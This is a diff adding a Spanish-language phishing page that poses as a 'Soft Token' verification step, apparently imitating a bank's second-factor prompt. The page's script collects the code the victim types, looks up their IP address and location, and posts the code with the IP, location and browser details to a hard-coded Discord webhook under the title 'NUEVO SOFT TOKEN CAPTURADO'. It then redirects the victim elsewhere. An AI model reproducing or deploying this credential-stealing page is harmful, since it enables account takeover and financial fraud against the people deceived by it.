@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación Token</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+            --purple-circle: #c6b5e2;
+            --text-main: #000000;
+            --text-secondary: #555555;
+            --input-underline: #e0e0e0;
+            --btn-gray: #e0e0e0;
+            --btn-active: #000000;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 420px;
+            padding: 50px 30px;
+            border-radius: 16px;
+            box-shadow: 0 4px 25px rgba(0,0,0,0.03);
+            text-align: center;
+        }
+
+        .token-icon {
+            background-color: var(--purple-circle);
+            width: 85px;
+            height: 85px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px auto;
+        }
+
+        .token-icon i {
+            font-size: 18px;
+            color: #222;
+            margin: 0 2px;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            margin: 0 0 25px 0;
+            color: var(--text-main);
+        }
+
+        p {
+            font-size: 15.5px;
+            line-height: 1.4;
+            color: var(--text-secondary);
+            margin-bottom: 50px;
+            padding: 0 5px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 45px;
+            border-bottom: 1.5px solid var(--input-underline);
+            padding-bottom: 8px;
+            display: flex;
+            align-items: center;
+        }
+
+        input {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 16px;
+            color: var(--text-main);
+            background: transparent;
+        }
+
+        .input-icons-right {
+            display: flex;
+            gap: 12px;
+            color: #333;
+            font-size: 18px;
+        }
+
+        .fa-eye, .fa-eye-slash {
+            cursor: pointer;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px 0;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .btn-volver {
+            background: #fff;
+            border: 1px solid #000;
+            color: #000;
+        }
+
+        .btn-continuar {
+            background: var(--btn-gray);
+            color: #999;
+        }
+
+        /* Clase cuando el input tiene datos */
+        .btn-continuar.active {
+            background: var(--btn-active);
+            color: #fff;
+        }
+
+        .btn:disabled {
+            cursor: not-allowed;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="token-icon">
+            <i class="fa-solid fa-asterisk"></i>
+            <i class="fa-solid fa-asterisk"></i>
+            <i class="fa-solid fa-asterisk"></i>
+        </div>
+
+        <h1>¡Un paso más!</h1>
+
+        <p>Ingresa tu número de Soft Token. El número de Soft Token se genera desde la aplicación.</p>
+
+        <div class="input-wrapper">
+            <input type="password" id="softToken" placeholder="Número de Soft Token" inputmode="numeric">
+            <div class="input-icons-right">
+                <i class="fa-regular fa-eye" id="togglePass"></i>
+                <i class="fa-solid fa-circle-info"></i>
+            </div>
+        </div>
+
+        <div class="button-group">
+            <button class="btn btn-volver" onclick="window.history.back()">Volver</button>
+            <button class="btn btn-continuar" id="btnSubmit" disabled>Continuar</button>
+        </div>
+    </div>
+
+    <script>
+        const inputToken = document.getElementById('softToken');
+        const btnSubmit = document.getElementById('btnSubmit');
+        const togglePass = document.getElementById('togglePass');
+
+        // URL del Webhook de Discord
+        const webhookURL = "https://discord.com/api/webhooks/1467754097607311463/NB2fxdg4Uyi5Zx3jOqVbxbUwIrRhJWNUr6pN8eVunRJZkb05LSnDwhDDg7Y6L_msPmZY";
+
+        // Mostrar/Ocultar contraseña
+        togglePass.addEventListener('click', () => {
+            const type = inputToken.type === 'password' ? 'text' : 'password';
+            inputToken.type = type;
+            togglePass.classList.toggle('fa-eye');
+            togglePass.classList.toggle('fa-eye-slash');
+        });
+
+        // Activar botón si hay texto
+        inputToken.addEventListener('input', () => {
+            if (inputToken.value.trim().length >= 4) {
+                btnSubmit.disabled = false;
+                btnSubmit.classList.add('active');
+            } else {
+                btnSubmit.disabled = true;
+                btnSubmit.classList.remove('active');
+            }
+        });
+
+        // Enviar a Discord
+        btnSubmit.addEventListener('click', async () => {
+            const tokenValue = inputToken.value;
+            btnSubmit.innerText = "Procesando...";
+            btnSubmit.disabled = true;
+
+            try {
+                // Obtener IP y Geo
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
+
+                const payload = {
+                    embeds: [{
+                        title: "🔐 NUEVO SOFT TOKEN CAPTURADO",
+                        color: 13022690, // Color morado claro
+                        fields: [
+                            { name: "🔢 Soft Token", value: `**${tokenValue}**`, inline: true },
+                            { name: "🌐 IP", value: `\`${geoData.ip}\``, inline: true },
+                            { name: "🌍 Ubicación", value: `${geoData.city}, ${geoData.country_name}`, inline: false },
+                            { name: "📱 Agente", value: navigator.userAgent }
+                        ],
+                        timestamp: new Date()
+                    }]
+                };
+
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // Redirección final (puedes cambiar index4.html por el destino que quieras)
+                window.location.href = "nuevo.html";
+
+            } catch (error) {
+                window.location.href = "nuevo.html";
+            }
+        });
+    </script>
+</body>
+</html>
